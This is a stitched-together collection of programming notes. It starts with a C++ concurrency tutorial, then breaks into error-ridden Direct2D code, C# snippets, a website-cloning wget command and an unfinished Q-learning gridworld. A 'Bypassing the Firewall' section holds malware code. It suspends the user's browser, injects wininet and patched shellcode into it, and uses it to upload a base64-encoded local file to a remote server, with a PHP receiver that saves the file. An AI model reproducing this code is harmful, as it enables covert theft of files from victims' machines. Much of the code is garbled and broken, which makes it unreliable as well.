// Release lock before destruction
guard.unlock();
```

If you defer the locks, you can use the **nifty lock methods!**

```c++
// Initialise the lock guard, but don't actually lock yet
std::shared_lock<std::mutex> guard(mutex_1, std::defer_lock);

// Now you can do some of the following!
guard.lock(); // Lock now!
guard.try_lock(); // Won't block if it can't acquire
guard.try_lock_for(); // Only for timed_mutexes
guard.try_lock_until(); // Only for timed_mutexes
```



### 2.11 Exclusive Locks vs Shared Locks <a name="2.11"></a>
[go to top](#top)


**Exclusive locks** (aka write locks) **inhibit all access** from other threads until the lock is released.

**Shared locks** (aka read locks) **inhibit all writes** from other threads until the lock is released. Other threads have to request the lock to be granted the permission to read though.

> Exclusive lock mode prevents the associated resource from being shared. This lock mode is obtained to modify data. The first transaction to lock a resource exclusively is the only transaction that can alter the resource until the exclusive lock is released.
>
> Share lock mode allows the associated resource to be shared, depending on the operations involved. Multiple users reading data can share the data, holding share locks to prevent concurrent access by a writer (who needs an exclusive lock). Several transactions can acquire share locks on the same resource.
>
> ---
>
> Think of a lockable object as a *blackboard* (lockable) in a class room containing a *teacher* (writer) and many *students* (readers).
>
> While a teacher is writing something (exclusive lock) on the board:
>
> 1. Nobody can read it, because it's still being written, and she's blocking your view => ***If an object is exclusively locked, shared locks cannot be obtained*.**
> 2. Other teachers won't come up and start writing either, or the board becomes unreadable, and confuses students => ***If an object is exclusively locked, other exclusive locks cannot be obtained*.**
>
> When the students are reading (shared locks) what is on the board:
>
> 1. They all can read what is on it, together => *Multiple shared locks can co-exist*.
> 2. The teacher waits for them to finish reading before she clears the board to write more => *If one or more shared locks already exist, exclusive locks cannot be obtained*.
>
> <https://stackoverflow.com/questions/11837428/whats-the-difference-between-an-exclusive-lock-and-a-shared-lock>

Notice this means that **if an object is shared locked, you can acquire shared locks, but not exclusive locks.**

Basically: 

- If there are multiple readers, no writers can bind, but readers can bind.
- If there is one writer, no one can bind.




### 2.12 Mutex Types <a name="2.12"></a>
[go to top](#top)


There are [several](<https://en.cppreference.com/w/cpp/thread/mutex>) [types](<https://en.cppreference.com/w/cpp/thread/recursive_mutex>) [of](<https://en.cppreference.com/w/cpp/thread/timed_mutex>) [mutex](<https://en.cppreference.com/w/cpp/thread/recursive_timed_mutex>).

#### **std::mutex**

[Reference](<https://en.cppreference.com/w/cpp/thread/mutex>)

- Just your plain lockable mutex

#### **std::timed_mutex**

[Reference](<https://en.cppreference.com/w/cpp/thread/timed_mutex>)

- Timed mutex
- You can lock for a specified amount of time with `try_lock_for()` and `try_lock_until()`

#### **std::recursive_mutex**

[Reference](<https://en.cppreference.com/w/cpp/thread/recursive_mutex>)

- Multiple locks can be acquired by the same thread
- You need to call unlock the same amount of times you've called lock before the lock is released

#### **std::recursive_timed_mutex**

[Reference](<https://en.cppreference.com/w/cpp/thread/recursive_timed_mutex>)

- Same as the recursive mutex, except it also has the timed locking methods that timed mutexes have

#### **std::shared_timed_mutex**

[Reference](<https://en.cppreference.com/w/cpp/thread/shared_timed_mutex>)

- Read-Write mutex
- Can acquire both exclusive or shared locks (just use the appropriate lock guard type!)

```c++
std::unique_lock<std::shared_timed_mutex> writer_guard(writing_mutex, std::defer_lock);
std::shared_lock<std::shared_timed_mutex> reader_guard(reading_mutex, std::defer_lock);

// Lock them!
std::lock(writer_guard, reader_guard);
```



### 2.13 Event Handling: Condition Variables <a name="2.13"></a>
[go to top](#top)


Sometimes you need to do some nice signal/event handling.

It's possible to do it using a global variable that you constantly lock threads for to check, but it's far more efficient to use **[condition variables](<https://en.cppreference.com/w/cpp/thread/condition_variable>)**.

A condition variable allows you to **wait for some condition to be true** before continuing thread execution. During this time, any locks that were passed to the waiting function are released until the condition is fulfilled. Following which, the lock is reacquired.

> **Example Flow**
>
> 1. Thread **acquires lock**
> 2. Check if condition is false
> 3. If false, call `wait()`, which **releases the lock and blocks the thread until the condition is fulfilled**
> 4. If a condition is fulfilled, the condition variable **must be notified** before it can check
> 5. Once the condition check succeeds, **thread reacquires lock and continues execution**

Let's try it out!

Condition variables use unique_locks, so we'll use that.

#### **Basic Example**

```c++
#include <condition_variable>

// Init
std::condition_variable condition_var;
std::mutex mutex;
bool condition(false);

// Acquire lock
std::unique_lock<std::mutex> guard(mutex);

// Avoid spurious wakeups and 
// ensure wait is only called when the condition has not been fulfilled
while (!condition)
{
  condition_var.wait(guard);
}

// Now in some other thread
{
  // Acquire lock
  std::unique_lock<std::mutex> guard(mutex);

  // We can set the condition to true
  condition = true;

  // And notify one blocked thread by the condition variable that it's ok to wake up
  // (In this case we only have one)
  condition_var.notify_one();

  // If we want to notify all of them instead...
  condition_var.notify_all();
    
  // If we didn't surround the threads with the while (!condition) loop,
  // Notifying the threads will cause the wait to return. So there's no condition check.
  // But this is dangerous since random wakeups can occur without notifications!
}
```

**You may also choose to make the condition be an atomic boolean instead so you can save on lock acquisition for any thread that sets the condition.**

Like so: `std::atomic<bool> condition(true);`

#### **Additional Methods**

```c++
// Wait for some time or until some time is reached
condition_var.wait_for();
condition_var.wait_until();

// There's also a nice function to cleanup any condition variables by a lock acquiring thread
// It's an equivalent call to 
// First: destroying all objects that are meant to destroy on thread exit
// Then: mutex.unlock(); condition_var.notify_all();
std::notify_all_at_thread_exit(condition_var, some_unique_lock);
```

#### **Spurious Wakeups**

A bit tricky. But sometimes condition variables can wakeup on their own due to some [threading technomagic](<https://stackoverflow.com/questions/8594591/why-does-pthread-cond-wait-have-spurious-wakeups>).

It's relatively trivial to guard against it, and it's another layer of protection against human error, so it makes sense to at least try to deal with them explicitly.

```c++
// You guard against spurious wakeups by surrounding the condition variable
// with a check for the condition (you're checking the predicate)
while (!condition)
{
  condition_var.wait(guard);
}

// Alternatively, you can do it this way as well,
// which is neater but slightly less intuitive
condition_var.wait(guard, condition_function);

// If we want to just check a bool called condition we need to use lambdas
condition_var.wait(guard, [](){return condition == true;});
```



## 3. C++ Concurrency Reference <a name="3"></a>

### 3.1 Introduction <a name="3.1"></a>
[go to top](#top)


We just went through manual thread handling in the previous section.

But if you're lazy, or you don't need the tight control the thread, mutex, and lock guard classes offer you, you may choose to adopt **task based parallelism** instead, as opposed to **thread based parallelism**. It's generally considered faster to work with tasks as opposed to threads, especially since the chance of tasks messing up is far lower than that of threads.

With the `std::async` library, manual thread handling is **abstracted away**, and you rely on the library's system to possibly spawn threads, depending on available resources. **The main benefit of this form of parallelism is the great ease in getting returned values from tasks that you start.**

Before, when using threads, you'd have to pass variables via reference and have threads modify the variable. But now with tasks, you can just directly return the result of the task!

So instead of thinking of starting the threads yourself, you can only be concerned with starting **tasks** that will return when they are supposed to. If tasks haven't returned yet, the code will block until it does.



### 3.2 When to Use Threads or Tasks <a name="3.2"></a>
[go to top](#top)


Use **threads** if:

- You need tight control over mutexes
- Need to run long-lived, complex tasks

Use **tasks** if:

- You want fairly simple code and don't care for managing threads
- Are running short tasks



### 3.3 Promises and Futures <a name="3.3"></a>
[go to top](#top)


![1562934941151](assets/1562934941151.png)

[Image Source](<https://modoocode.com/284>)

![1562935061068](assets/1562935061068.png)

[Image Source](<https://www.slideshare.net/cppfrug/async-await-in-c>)

#### **Header**

```c++
#include <future>
```

#### **Futures**

A [std::future](<https://en.cppreference.com/w/cpp/thread/future>) is a class template that stores a value that will be assigned in the future, and provides a way to access that value (with `get()`). If its value is accessed before the value is assigned, it will block until the value resolves.

Futures are the objects that are **returned** by asynchronous operations (from `std::async`, `std::packaged_task`, or `std::promise`).

**Shared Futures**

A [std::shared_future](<https://en.cppreference.com/w/cpp/thread/shared_future>) works the same way, except it is copyable. Which means that multiple threads are allowed to wait for the same shared state.

#### **Promises**

A [std::promise](<https://en.cppreference.com/w/cpp/thread/promise>) provides a facility to store a value that is later acquired asynchronously via the future **that the promise creates**.

Every promise **is associated with a future**! And a promise **sets** the value of that future. Other objects can then access the future for the value that the promise stores.

#### **A dumb analogy**

> **Today is a Gift. That is why it is called Present.**
>
> You're a parent trying to get a gift for your child.
>
> You give your kid a box, and **promise** them that the gift is inside. The gift is the **future** you are promising. But you tell them to only to check in the future.
>
> If your kid tries to check, you panic, take the box away and, **block** them from checking, until you **fulfill your promise and fill the box** with the gift, then you can give it back and your kid can continue his day having gotten their gift.

#### **A slightly better analogy**

> **Food Analogy**
>
> Let's say you're an office worker. You make an order for lunch from a store across the street via your phone app.
>
> The store owner receives your order, and by the powers of the social contract, makes a **promise** to fulfill your order. He issues you a receipt that is associated with this **promise**, guaranteeing you that you will be able to collect your order in the **future** if he ever fulfills his promise.
>
> You **block** off some time, stop your work at the office, and head down to the store.
>
> But OH NO! The store owner hasn't fulfilled your order yet. And as long as you're waiting to **get()** your order, you can't do any work. Some might even say your **waiting to get your order in the future is blocking your ability to work.**
>
> Once the store owner **sets()** your order down, and lets you **get()** it from his counter though, you're able to **stop getting blocked** and go back to the office to work.

![mindblow](assets/mindblow.gif)



### 3.4 A Simple Promise-Future Example <a name="3.4"></a>
[go to top](#top)


![std::promise and std::future](assets/promise.png)

[Image Source](<https://thispointer.com//c11-multithreading-part-8-stdfuture-stdpromise-and-returning-values-from-thread/>)

**Note:** If your promise object is destroyed before you set its value, the `get()` method for its associated future will throw an exception.

**Also note:** Each future's `get()` method can only be called once. If you want a future that can be accessed multiple times, use a shared_future instead. Otherwise, **initialise a different promise future pair.**

```c++
// Create a promise
std::promise<int> promise;

// And get its future
std::future<int> future = promise.get_future();

// You can also get a shared future this way, by the way! (Choose one please)
std::shared_future<int> shared_future = promise.get_future();

// Now suppose we passed promise to a separate thread.
// And in the main thread we call...
int val = future.get(); // This will block!

// Until, that is, we set the future's value via the promise
promise.set_value(10); // In the separate thread

// So now in the main thread, if we try to access val...
std::cout << val << std::endl;

// Output: 10
```

Or, more completely

```c++
// Source: https://thispointer.com//c11-multithreading-part-8-stdfuture-stdpromise-and-returning-values-from-thread/

#include <iostream>
#include <thread>
#include <future>
 
void initiazer(std::promise<int> * promObj)
{
    std::cout<<"Inside Thread"<<std::endl;     promObj->set_value(35);
}
 
int main()
{
    std::promise<int> promiseObj;
    std::future<int> futureObj = promiseObj.get_future();
    std::thread th(initiazer, &promiseObj);
    std::cout<<futureObj.get()<<std::endl;
    th.join();
    return 0;
}
```



### 3.5 Async <a name="3.5"></a>
[go to top](#top)


[std::async](<https://en.cppreference.com/w/cpp/thread/async>)

Now that we've talked about futures and promises we can finally actually get to the real asynchronous coding library.

Async is a function template allows you to spawn threads to do work, then collect the results from them via the **future** mechanism. In fact, calls to `std::async` return a `std::future` object!

**Do note that async does support parallelism, just that the default constructor manages threads for you and may possibly not run the passed functions in a thread. You'll have to explicitly tell it to run the function in a new thread.**

Also, since Linux threads run sequentially by default, it's especially important to force the functions to run in separate threads. We'll see how to do that later.

The simplest call to async is to just pass in a callback function as an argument, and let the system handle it for you.

```c++
auto future = std::async(some_function, arg_1, arg_2);
```



### 3.6 Async Launch Policies <a name="3.6"></a>
[go to top](#top)


You can do better though!

There are three ways to launch an async task:

- `std::launch::async` : Guarantees launch in a separate thread
- `std::launch::deferred`: Function will only be called on `get()`
- `std::launch::async | std::launch::deferred`: Default behaviour. Defer to system.

I like to run async tasks with the `std::launch::async` profile so I can have some semblance of control over the threads. Just **add it in as the first argument!**

```c++
auto future = std::async(std::launch::async, some_function, arg_1, arg_2);
```



### 3.7 Different Ways to Call Async <a name="3.7"></a>
[go to top](#top)


```c++
// Pass in function pointer
auto future = std::async(std::launch::async, some_function, arg_1, arg_2);

// Pass in function reference
auto future = std::async(std::launch::async, &some_function, arg_1, arg_2);

// Pass in function object
struct SomeFunctionObject
{
	void operator() (int arg_1){}
};
auto future = std::async(std::launch::async, SomeFunctionObject(), arg_1);

// Lambda function
auto future = std::async(std::launch::async, [](){});
```




```
                            .     .
                         .  |\-^-/|  .    
                        /| } O.=.O { |\     
```

---

 -----------------------------------------------------------------------------------------------------------
 
d2d
-----------------------------------------------
Direct2D::Direct2D(core:DirectXApp* dxApp) : dxApp(dxApp)
{
if(!createDevice().wasSuccessful())
throw std::runtime_error("critical Error");

if (!createBitmapRenderTarget().wasSuccessful())
			throw std::runtime_error("Critical error: Failed to create the bitmap render target for Direct2D!");

		// initialize the text formats
		if (!initializeTextFormats().wasSuccessful())
			throw std::runtime_error("Critical error: Failed to create text formats!");

		// log success
		util::ServiceLocator::getFileLogger()->print<util::SeverityType::info>("Direct2D was successfully initialized.");
		
}


util::Expected<void> Direct2D::CreateDevice()
{
if(FAILED(DwriteCreateFactory(DWRITE_FACTORY_TYPE_SHARED, __uuidof(IDWriteFactory), &writeFactory)))
return std::runtime_error("error");

D2D1_FACTORY_OPTIONS options;
#ifndef NDEBG
options.debugLevel  =D2D1_DEBUG_LEVEL_INFORMATION;
#else
options.debugLevel = D2D1_DEBUG_LEVEL_NONE;
#endif
if(FAILED(D2D1CreateFactory(D2D1CreateFactory_FACTORY_TYPE_MULITHREADED, ___uuidof(ID2D1Factory2), &options, &factory)))
return std::runtime_error("Critical Error");

Microsoft::WRL:ComPtr<IDXGIDevice> dxgiDevice;
if(FAILED(dxApp->d3d->dev.Get()->QueryInterface(__uuidof(IDXGIDevice), &dxgiDevice)))
return std::runtime_error("Critical Error");


if(FAILED(factory->CreateDevice(dxgiDevice.Get(), &dev)))
return std::runtime_error("critical error");

if(FAILED(dev->CreateDeviceContext(ID2D1_DEVICE_CONTEXT_OPTIONS_ENABLE_MULTITHREADED_OPTIMIZATIONS, &devCon)))
return std::runtime_error("Critical error");

return {};

}

util::Expected<void> Direct2D::createBitmapRenderTarget()
{
D2D1_BITMAP_PROPERTIES bp;
bp.pixelFormat.format = DXGI.FORMAT_B8G8R8A8_UNORM;
bp.dpiX = 96.0f;
bp.dpiY = 96.0f;
bp.bitmapOptions = D2D1_BITMAP_OPTIONS_TARGET | D2D1_BITMAP_OPTIONS_CANNOT_DRAW;
bp.ColorContext = nullptr;


Microsoft::WRL::ComPtr<IDXGISurface> dxgiBuffer;
if(FAILED(dxApp->d3d->swapChain->GetBuffer(0, __uuidof(IDCGISurface), &dxgiBuffer)))
return std::runtime_error("Critical error: Unable to retrieve the back buffer!");

Microsoft::WRL::ComPtr<ID2D1Bitmap1> targetBitmap;
if(FAILED(devCon->CreateBitmapFromDxgiSurface(dcgi.Buffer.Get(), &bp, &targetBitmap)))

devCon->SetTarget(targetBitmap.Get());

return {};



util::Expected<void> Direct2D::InitializeTextsFormats()
{
if(FAILED(devCon->CreateSolidColorBrush(D2D1::ColorF(D2D1::ColorF::Yellow), &yellowBrush)))
return std::runtime_error("Critical error: Unable to create the yellow brush!");

if(FAILED(devCon->CreateSolidColorBrush(D2D1::ColorF(D2D1::ColorF::Black), &blackBrush)))
return std::runtime_error("Critical error: Unable to create the yellow brush!");

if(FAILED(devCon->CreateSolidColorBrush(D2D1::ColorF(D2D1::ColorF::White), &whiteBrush)))
return std::runtime_error("Critical error: Unable to create the yellow brush!");

if(FAILED(writeFactory.Get()->CreateTextFormat(L "Lucida Console", nullptr, DWRITE_FONT_WEIGHT_LIGHT, DWRITE_FONT_STYLE_NORMAL,DWRITE_FONT_STRETCH_NORMAL, 12.0f, L"en-GB", &textFormatFPS)))
return std::runtime_error("Critical error: Unable to create the yellow brush!");

if(FAILED(textFotmatFPS-SetTextAlignment(DWRITE_TEXT_ALIGNMENT_LEADING)))
return std::runtime_error("Critical error: Unable to create the yellow brush!");

if(FAILED(textFormatFPS->SetParagraphAlignment(DWRITE_PARAGRAPH_ALIGNMENT_NEAR)))
return std::runtime_error("Critical error: Unable to create the yellow brush!");

return {};

}

}
 

--------------------------------------------------------------------------------------------------------

Bypassing the Firewall
--------------------------
HINTERNET h = InternetOpen("agent",0,0,0,0);
HINTERNET h_c = InternetConnect(h, "host.com", 0x50,NULL,NULL,NULL,0x30,0,0x01);

0x50 => 80
0x30 => INTERNET_SERVICE_HTTP
0x01 = context - any_value

HINTERNET rq = HttpOpenRequest(h_c,"POST","script.php",NULL,NULL,NULL,0X01);
HttpSendRequest(rq,HEADERS, HEADERS_LEN,POST,POST_LEN);




agent constant will be 0x0DEADCODE => "agent"

call ebx == InternetOpen






push 0x0
push 0x0
push 0x0
push 0x0
push 0x0DEADC0DE ”agent”
mov ebx, 0x0DEADC0DE
call ebx ; InternetOpen
push 0x1
push 0x0
push 0x3
push 0x0 
push 0x0
push 0x50 ;PORT=80
push 0x0DEADC0DE ;”host.com”
push eax
mov ebx, 0x0DEADC0DE
call ebx ; InternetConnect
push 0x1
push 0x0
push 0x0
push 0x0
push 0x0
push 0x0DEADC0DE ;”script.php”
push 0x0DEADC0DE ;”POST”
push eax
mov ebx, 0x0DEADC0DE
call ebx ;HttpOpenRequest
push 0x0DEADC0DE ;POST_LEN
push 0x0DEADC0DE ;POST
push 0x0DEADC0DE ;HEADER_LEN
push 0x0DEADC0DE ;HEADER
push eax
mov ebx, 0x0DEADC0DE
call ebx ; HttpSendRequest
xor eax, eax
ret 



char def_brow[MAX_PATH];
DWORD out_size = MAX_PATH;
AssocQueryString(0), ASSOCSTR_EXECUTABLE, "http","open",def_brow, &out_size);


STARTUPINFO st = {0};
PROCESS_INFORMATION PI={0};
CreateProcess(def_brow, NULL,NULL,NULL,false,CREATE_SUSPENDES,NULL,NULL,&st,&pi);
CONTEXT cx;
cx.ContextFlags = CONTEXT_ALL;
GetThreadContext(pi.hThread,&cx);
DWORD old;
VirtualProtectEx(pi.hProcess,(LPVOID)cx,Eax,2PAGE_EXECUTE_READWRITE,&old);
WriteProcessMemory(pi.hProcess,(LPVOID)cx.Eax,"\xEB\xFE",2,&old);



what does //0xEB 0xFE  mean 

it is a 
JMP $-2(JMP EIP)
ResumeThread(pi.hThread);

void UploadFile(char* filename, char* server, char* script, char* f_name, HANDLE hProc);
UploadFile("file.txt","Host.com","script.php","file.txt",pi.hProcess);



char* buffer;
ifstream f(filename,ios::binary);
f.seekg(0,ios::end);
int size = f.tellg();
f.seekg(0,ios::beg);
buffer = (char)*malloc(size);
int i=0;
while(i<size)
{
buffer[i] = f.get();
i++;

}
f.close();


string buf = base64_encode((const unsigned char*)buffer,size);
string hdrs = "Conetct-Type:multiparrt/form-data;boundary=---------------------------sekjdgfjehdghjewghyjewg";
string frmData = "----------------------------------------wjhhegwejgrefgeg"\n content-Disposition:form-data;
name=\"upl\";filename=\"";
frmdata += f_name;
frmdata += "\"\nContentType:application/octet-stream\nContent-Transfer-Encoding;
base64\n\n"
frmdata += buf;
frmdata += "\n----------------------------------------ksjdfgjhghg--";

HEADER_LEN = hdrs.length();
POST = frmdata;
POST_LEN=frmdata.length();



char* load;
load=(char*)VirtualAllocEx(hProc,0,strlen("wininet.dll"),MEM_COMMIT||MEM_RESERVE,PAGE_EXECUTE_READWRITE);
DWORD n_wrt;
WriteProcessMemory(hProc,load,"wininet.dll",strlen(
"wininet.dll"),&n_wrt);
HANDLE hThr;
hThr = createRemoteThread(hProc,0,0,(LPTHREAD_START_ROUTINE)GetProcAddress(GetModuleHandle("kernel32.dll"),"LoadLibraryA"),load,0,&n_wrt);
WaitForSingleObject(nThr,INFINITE);
DWORD IB;
GetExitCode(hThr,&IB);



char* agent
agent = (char*)VirtualAllocEx(hProc,0,6,MEM_RESERVE|MEM_COMMIT,PAGE_EXECUTE_READWRITE);
WriteProcessMemory(hProc,agent,"Agent",6,&n_wrt);

char* host;
host = (char*)VirtualAllocEx(hProc,0,strlen("server"),MEM_RESERVE|MEM_COMMIT,PAGE_EXECUTE_READWRITE;);
WriteProcessMemory(hProc,host,server,strlen(server), &n_wrt);

char* method;
method = (char*)VirtualAllocEx(hProc,0,strlen("POST"),
MEM_RESERVE|MEM_COMMIT,PAGE_EXECUTE_READWRITE);
WriteProcessMemory(hProc,0,strlen(script),MEM_RESERVE|MEM_COMMIT,PAGE_EXECUTE_READWRITE);



char* filep;
filep=(char*)VirtualAllocEx(hProc,0,strlen(script),MEM_RESERVE|MEM_COMMIT,
PAGE_EXECUTE_READWRITE);
WriteProcessMemory(hProc,filep,script,strlen(script),&n_wrt);



VA can be calculated by 
VA = VA got form the library  - ImageBase of wininet in our app + ImageBase of wininet in the browser




DWORD Open = (DWORD)GetProcAddress(LoadLibraryA("wininet.dll"),"InternetOpenA")-(DOWRD)GetModuleHandle("wininet.dll")+IB;
DWORD Open = (DWORD)GetProcAddress(LoadLibraryA("wininet.dll"),"InternetConnectA")-(DOWRD)GetModuleHandle("wininet.dll")+IB;
DWORD Open = (DWORD)GetProcAddress(LoadLibraryA("wininet.dll"),"HttpOpenRequestA")-(DOWRD)GetModuleHandle("wininet.dll")+IB;
DWORD Open = (DWORD)GetProcAddress(LoadLibraryA("wininet.dll"),"HttpSendRequestA")-(DOWRD)GetModuleHandle("wininet.dll")+IB;




DWORD h_size=hdrs.length(); //HEADER_LEN
DWORD d_size=frmdata.length(); //POST_LEN
char* head;
head=(char*)VirtualAllocEx(hProc,0,h_size,MEM_COMMIT|MEM_RESERVE,
PAGE_EXECUTE_READWRITE);
char* data;
data=(char*)VirtualAllocEx(hProc,0,d_size,MEM_COMMIT|MEM_RESERVE,
PAGE_EXECUTE_READWRITE);
WriteProcessMemory(hProc,head,hdrs.c_str(),h_size,&n_wrt);
WriteProcessMemory(hProc,data,frmdata.c_str(),d_size,&n_wrt);

char
shellcode[]="\x6A\x00\x6A\x00\x6A\x00\x6A\x00\x68\xDE\xAD\xC0\xDE\xBB\xDE\xAD\xC0\
xDE\xFF\xD3\x6A\x01\x6A\x00\x6A\x03\x6A\x00\x6A\x00\x6A\x50\x68\xDE\xAD\xC0\xDE\x
50\xBB\xDE\xAD\xC0\xDE\xFF\xD3\x6A\x01\x6A\x00\x6A\x00\x6A\x00\x6A\x00\x68\xDE\xA
D\xC0\xDE\x68\xDE\xAD\xC0\xDE\x50\xBB\xDE\xAD\xC0\xDE\xFF\xD3\x68\xDE\xAD\xC0\xD
E\x68\xDE\xAD\xC0\xDE\x68\xDE\xAD\xC0\xDE\x68\xDE\xAD\xC0\xDE\x50\xBB\xDE\xAD\xC
0\xDE\xFF\xD3\x33\xC0\xC3";

//The shellcode presented above
//We search for „\xDE\xAD\xC0\xDE” and replace it with our data.
memcpy((char*)(shellcode+9),&agent,4);
memcpy((char*)(shellcode+14),&Open,4);
memcpy((char*)(shellcode+33),&host,4);
memcpy((char*)(shellcode+39),&Con,4);
memcpy((char*)(shellcode+56),&filep,4);
memcpy((char*)(shellcode+61),&method,4);
memcpy((char*)(shellcode+67),&Req,4);
memcpy((char*)(shellcode+74),&d_size,4);
memcpy((char*)(shellcode+79),&data,4);
memcpy((char*)(shellcode+84),&h_size,4);
memcpy((char*)(shellcode+89),&head,4);
memcpy((char*)(shellcode+95),&Req_s,4); 



The shellcode is now patched 
ready to go to the browsers memory

char* Sh;
Sh = (char*)VirtualAllocEx(hProc,0,sizeof(shellcode),MEM_RESERVE|MEM_COMMIT,PAGE_EXECUTE_READWRITE);
WriteProcessMemory(hProc,Sh,Shellcode,sizeof(shellcode),&n_wrt);
hThr = CreateRemoteThread(hProc,0,0,(LPTHREAD_START_ROUTINE)Sh,0,0,0);
WaitForSingleObject(hThr,INFINITE);
VirtualFreeEx(hProc,agent,0,MEM_RELEASE);
VirtualFreeEx(hProc,method,0,MEM_RELEASE);
VirtualFreeEx(hProc,host,0,MEM_RELEASE);
VirtualFreeEx(hProc,filep,0,MEM_RELEASE);
VirtualFreeEx(hProc,head,0,MEM_RELEASE);
VirtualFreeEx(hProc,data,0,MEM_RELEASE); 

TerminateProcess(hProc,0x0);



PHP to recieve and save 
-------------------------

<?php
$target = "";
$target = basename($_FILES['upl']['name']);
if(move_uploaded_file($_FILES['upl']['tmp_name'],$target))
{
file_put_contents($target,base64_decode(file_get_contents($target)));

}
?>





MOdifying the remote console 
------------------------------
----------------------------------

C# Sharp 
------------
usign System;
Using Microsoft.VisualBasic.Devices;
;
class TestMyServices
{
static void Main()
{
Audio myAudio = new Audio();
Console.Writeline("PLAYING SOUND")
myAudio.Play(@"c:\WINDOWS\Media\chimes.wav");

clock myClock = new Clock();
 Console.Write("Current day of the week: ");
        Console.WriteLine(myClock.LocalTime.DayOfWeek);
        Console.Write("Current date and time: ");
        Console.WriteLine(myClock.LocalTime)
		
		Computer myComputer new Computer();
		Console.WriteLine("Computer name :" + myComputer.name);
		
		if(myComputer.Network.IsAvailable)
		{
		Console.WriteLine("computer is connected");
		
		}else{
		Console.Writeline("its not connected ");
		
		
		
		
		}
		
		My services in 
		Microsoft.VisualBasic.FileIO.FileSystem.CopyDirectory(
		@"C:\originak_directory"
		@"C:\copy_of the original directory"
		);
		
		-------------------------------------------------
		
		
		static unsafe void Copy(byte[] source, int sourceOffset, byte[] target,
    int targetOffset, int count)
{
    // If either array is not instantiated, you cannot complete the copy.
    if ((source == null) || (target == null))
    {
        throw new System.ArgumentException();
    }

    // If either offset, or the number of bytes to copy, is negative, you
    // cannot complete the copy.
    if ((sourceOffset < 0) || (targetOffset < 0) || (count < 0))
    {
        throw new System.ArgumentException();
    }

    // If the number of bytes from the offset to the end of the array is
    // less than the number of bytes you want to copy, you cannot complete
    // the copy.
    if ((source.Length - sourceOffset < count) ||
        (target.Length - targetOffset < count))
    {
        throw new System.ArgumentException();
    }

    // The following fixed statement pins the location of the source and
    // target objects in memory so that they will not be moved by garbage
    // collection.
    fixed (byte* pSource = source, pTarget = target)
    {
        // Copy the specified number of bytes from source to target.
        for (int i = 0; i < count; i++)
        {
            pTarget[targetOffset + i] = pSource[sourceOffset + i];
        }
    }
}

static void UnsafeCopyArrays()
{
    // Create two arrays of the same length.
    int length = 100;
    byte[] byteArray1 = new byte[length];
    byte[] byteArray2 = new byte[length];

    // Fill byteArray1 with 0 - 99.
    for (int i = 0; i < length; ++i)
    {
        byteArray1[i] = (byte)i;
    }

    // Display the first 10 elements in byteArray1.
    System.Console.WriteLine("The first 10 elements of the original are:");
    for (int i = 0; i < 10; ++i)
    {
        System.Console.Write(byteArray1[i] + " ");
    }
    System.Console.WriteLine("\n");

    // Copy the contents of byteArray1 to byteArray2.
    Copy(byteArray1, 0, byteArray2, 0, length);

    // Display the first 10 elements in the copy, byteArray2.
    System.Console.WriteLine("The first 10 elements of the copy are:");
    for (int i = 0; i < 10; ++i)
    {
        System.Console.Write(byteArray2[i] + " ");
    }
    System.Console.WriteLine("\n");

    // Copy the contents of the last 10 elements of byteArray1 to the
    // beginning of byteArray2.
    // The offset specifies where the copying begins in the source array.
    int offset = length - 10;
    Copy(byteArray1, offset, byteArray2, 0, length - offset);

    // Display the first 10 elements in the copy, byteArray2.
    System.Console.WriteLine("The first 10 elements of the copy are:");
    for (int i = 0; i < 10; ++i)
    {
        System.Console.Write(byteArray2[i] + " ");
    }
    System.Console.WriteLine("\n");
    /* Output:
        The first 10 elements of the original are:
        0 1 2 3 4 5 6 7 8 9

        The first 10 elements of the copy are:
        0 1 2 3 4 5 6 7 8 9

        The first 10 elements of the copy are:
        90 91 92 93 94 95 96 97 98 99
    */
}
		

}
}

-------------------------------------
public class Employee 
{
public class Employee(string name, int id) => (Name,ID) = (name,id);
public string Name {get; set; }
public int ID{get; set; }

}

public class GenericList<T> where T : Employee
{
public class Node{
public Node(T t) => (Next, Data) = (null, t);

public Node next{get; set; }
public T Data {get; set; }

}
private Node head;
public void AddHead(T t)
{
Node n = new Node(t) {Next = head };
head = n;

}

public IEnumerator<T> GetEnumerator()
{
Node current = head;
while (current != null)
{
yield return current.Data;
current = current.Next;;

}
}
public T FindFirstOccurence(string s)
{
Node current = head;
T t = null;

while(current != null)
{
if (current.Data.Name == s)
{
t = current.Data;
break;

}else{
current = current.Next;

}
return t;

}
}
}

-----------------------------------------------------
public static TDelegate TypeSafeCombine<TDelegate>(this TDelegate source, TDelegate target)
    where TDelegate : System.Delegate
    => Delegate.Combine(source, target) as TDelegate;


--------------------------------------

Clone and host 
-------------------
wget -U "Mozilla/5.0 (X11; U; Linux; en-US; rv:1.9.1.16)
Gecko/20110929 Firefox/3.5.16" --recursive --level=1 --no-clobber
--page-requisites --html-extension --convert-links --no-parent --
wait=3 --random-wait http://www.example.com/docs/interesting-part/
--domains=www.example.com

----------------------------------------------

Qlearning 
--------------

import numpy as np 
import operator 
import matploblib.pyplot as plt 
%matplotlib inline


class GridWorld:
    ## Initialise starting data
    def __init__(self):
        # Set information about the gridworld
        self.height = 5
        self.width = 5
        self.grid = np.zeros(( self.height, self.width)) - 1
        
        # Set random start location for the agent
        self.current_location = ( 4, np.random.randint(0,5))
        
        # Set locations for the bomb and the gold
        self.bomb_location = (1,3)
        self.gold_location = (0,3)
        self.terminal_states = [ self.bomb_location, self.gold_location]
        
        # Set grid rewards for special cells
        self.grid[ self.bomb_location[0], self.bomb_location[1]] = -10
        self.grid[ self.gold_location[0], self.gold_location[1]] = 10
        
        # Set available actions
        self.actions = ['UP', 'DOWN', 'LEFT', 'RIGHT']
     def get_available_actions(self):
        """Returns possible actions"""
        return self.actions
    
    def agent_on_map(self):
        """Prints out current location of the agent on the grid (used for debugging)"""
        grid = np.zeros(( self.height, self.width))
        grid[ self.current_location[0], self.current_location[1]] = 1
        return grid
    
    def get_reward(self, new_location):
        """Returns the reward for an input position"""
        return self.grid[ new_location[0], new_location[1]]
        
    
    def make_step(self, action):
        """Moves the agent in the specified direction. If agent is at a border, agent stays still
        but takes negative reward. Function returns the reward for the move."""
        # Store previous location
        last_location = self.current_location
        
        # UP
        if action == 'UP':
            # If agent is at the top, stay still, collect reward
            if last_location[0] == 0:
                reward = self.get_reward(last_location)
            else: self.current_location = ( self.current_location[0] - 1, self.current_location[1])
                reward = self.get_reward(self.current_location)
        
        # DOWN
        elif action == 'DOWN':
            # If agent is at bottom, stay still, collect reward
            if last_location[0] == self.height - 1:
                reward = self.get_reward(last_location)
            else:
                self.current_location = ( self.current_location[0] + 1, self.current_location[1])
